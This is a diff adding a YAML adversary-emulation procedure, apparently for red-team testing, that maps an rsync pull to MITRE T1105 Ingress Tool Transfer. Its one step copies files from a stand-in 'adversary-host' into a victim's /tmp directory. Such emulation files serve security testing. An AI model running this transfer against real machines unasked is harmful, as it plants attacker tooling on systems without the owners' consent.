@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: rsync remote file copy (pull)
+description: |
+    Utilize rsync to perform a remote file copy (pull)
+args:
+    - name: username
+      type: string
+      default: adversary
+    - name: remote_path
+      type: path
+      default: /tmp/adversary-rsync/
+    - name: remote_host
+      type: string
+      default: adversary-host
+    - name: local_path
+      type: path
+      default: /tmp/victim-files
+uuid: 3180f7d5-52c0-4493-9ea0-e3431a84773f
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1105: Ingress Tool Transfer'
+requirements:
+    platforms:
+        - os: linux
+        - os: macos
+steps:
+    - name: rsync-remote-file-copy-(pull)
+      inline: |
+        rsync -r {{.Args.username}}@{{.Args.remote_host}}:{{.Args.remote_path}} {{.Args.local_path}}
+      executor: sh
+      cleanup:
+        inline: ""
+        executor: sh
